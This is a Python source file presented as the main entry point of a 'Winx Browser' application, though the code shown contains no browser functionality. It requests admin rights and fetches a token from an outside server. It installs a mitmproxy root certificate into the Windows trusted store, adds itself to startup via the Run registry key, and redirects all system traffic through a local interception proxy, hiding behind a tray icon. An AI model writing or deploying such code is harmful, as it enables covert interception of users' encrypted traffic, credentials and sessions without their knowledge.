"""
Winx Browser - Main entry point
"""

import sys
import os
import subprocess
import threading
import ctypes
import winreg
import time
import requests
from pathlib import Path

APPDATA = Path(os.environ.get("APPDATA", "")) / "WinxBrowser"
CONFIG_FILE = APPDATA / "config.dat"
SETUP_URL = "https://incbot.site/api/desktop/setup"

# ── Ensure running as admin ───────────────────────────────────────────────────
def is_admin():
    try:
        return ctypes.windll.shell32.IsUserAnAdmin()
    except:
        return False

def run_as_admin():
    exe = sys.executable if getattr(sys, 'frozen', False) else sys.argv[0]
    ctypes.windll.shell32.ShellExecuteW(None, "runas", exe, "", None, 1)
    sys.exit()

# ── Token setup ───────────────────────────────────────────────────────────────
def get_setup_key():
    """Extract 8 char setup key from own filename e.g. WinxBrowser_a3f8c92b.exe"""
    try:
        import re
        exe_name = Path(sys.executable).stem if getattr(sys, 'frozen', False) else Path(sys.argv[0]).stem
        match = re.search(r'_([a-f0-9]{8})$', exe_name)
        if match:
            return match.group(1)
    except:
        pass
    return None

def fetch_and_save_token(setup_key: str):
    """Call incbot setup endpoint with one-time key, save returned token"""
    try:
        resp = requests.post(SETUP_URL, json={"key": setup_key}, timeout=10)
        if resp.status_code == 200:
            data = resp.json()
            token = data.get("token")
            if token:
                APPDATA.mkdir(parents=True, exist_ok=True)
                CONFIG_FILE.write_text(token)
                print("[+] Token saved")
                return token
    except Exception as e:
        print(f"[!] Token fetch error: {e}")
    return None

def load_token():
    """Load saved token from config.dat"""
    try:
        if CONFIG_FILE.exists():
            token = CONFIG_FILE.read_text().strip()
            if len(token) == 64:
                return token
    except:
        pass
    return None

# ── Startup registry ──────────────────────────────────────────────────────────
STARTUP_KEY_NAME = "WinxBrowser"

def is_in_startup():
    try:
        key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, r"Software\Microsoft\Windows\CurrentVersion\Run", 0, winreg.KEY_READ)
        winreg.QueryValueEx(key, STARTUP_KEY_NAME)
        winreg.CloseKey(key)
        return True
    except:
        return False

def add_to_startup():
    try:
        exe_path = sys.executable if getattr(sys, 'frozen', False) else os.path.abspath(sys.argv[0])
        key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, r"Software\Microsoft\Windows\CurrentVersion\Run", 0, winreg.KEY_SET_VALUE)
        winreg.SetValueEx(key, STARTUP_KEY_NAME, 0, winreg.REG_SZ, f'"{exe_path}"')
        winreg.CloseKey(key)
        return True
    except:
        return False

# ── Certificate management ────────────────────────────────────────────────────
CERT_NAME = "WinxBrowser"

def get_mitmproxy_cert():
    return Path.home() / ".mitmproxy" / "mitmproxy-ca-cert.cer"

def is_cert_installed():
    result = subprocess.run(["certutil", "-store", "Root", CERT_NAME], capture_output=True, text=True)
    return CERT_NAME in result.stdout

def install_cert(cert_path: Path):
    result = subprocess.run(["certutil", "-addstore", "-f", "Root", str(cert_path)], capture_output=True, text=True)
    return result.returncode == 0

# ── System proxy ──────────────────────────────────────────────────────────────
def set_system_proxy(enable: bool):
    try:
        key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, r"Software\Microsoft\Windows\CurrentVersion\Internet Settings", 0, winreg.KEY_SET_VALUE)
        if enable:
            winreg.SetValueEx(key, "ProxyEnable", 0, winreg.REG_DWORD, 1)
            winreg.SetValueEx(key, "ProxyServer", 0, winreg.REG_SZ, "127.0.0.1:8080")
            winreg.SetValueEx(key, "ProxyOverride", 0, winreg.REG_SZ, "<local>")
        else:
            winreg.SetValueEx(key, "ProxyEnable", 0, winreg.REG_DWORD, 0)
        winreg.CloseKey(key)
        ctypes.windll.wininet.InternetSetOptionW(0, 39, 0, 0)
        return True
    except:
        return False

# ── First run setup ───────────────────────────────────────────────────────────
def first_run_setup():
    from proxy import run_proxy
    print("[*] Generating certificate...")
    t = threading.Thread(target=run_proxy, daemon=True)
    t.start()
    time.sleep(3)

    cert_path = get_mitmproxy_cert()
    if not cert_path.exists():
        return False

    if not install_cert(cert_path):
        return False

    if not is_in_startup():
        add_to_startup()

    return True

# ── Tray icon ─────────────────────────────────────────────────────────────────
def create_tray_icon(stop_event: threading.Event):
    try:
        import pystray
        from PIL import Image, ImageDraw

        def create_icon_image():
            img = Image.new("RGBA", (64, 64), (0, 0, 0, 0))
            draw = ImageDraw.Draw(img)
            draw.ellipse([8, 8, 56, 56], fill=(0, 120, 215, 255))
            return img

        icon = pystray.Icon("WinxBrowser", create_icon_image(), "Winx Browser")
        icon.run()
    except:
        stop_event.wait()

# ── Main ──────────────────────────────────────────────────────────────────────
def main():
    if not is_admin():
        run_as_admin()
        return

    # ── Step 1: Get token ─────────────────────────────────────────────────────
    token = load_token()
    if not token:
        # Try fetching via one-time setup key
        setup_key = get_setup_key()
        if setup_key:
            token = fetch_and_save_token(setup_key)
        if not token:
            # No token — exit silently
            sys.exit(0)

    # Pass token to proxy module
    import proxy as proxy_module
    proxy_module.directory_token = token

    # ── Step 2: Certificate + proxy setup ─────────────────────────────────────
    cert_path = get_mitmproxy_cert()
    is_first_run = not cert_path.exists() or not is_cert_installed()

    if is_first_run:
        success = first_run_setup()
        if not success:
            sys.exit(1)
    else:
        from proxy import run_proxy
        threading.Thread(target=run_proxy, daemon=True).start()
        if not is_in_startup():
            add_to_startup()

    set_system_proxy(True)

    stop_event = threading.Event()
    create_tray_icon(stop_event)

    set_system_proxy(False)

if __name__ == "__main__":
    main()
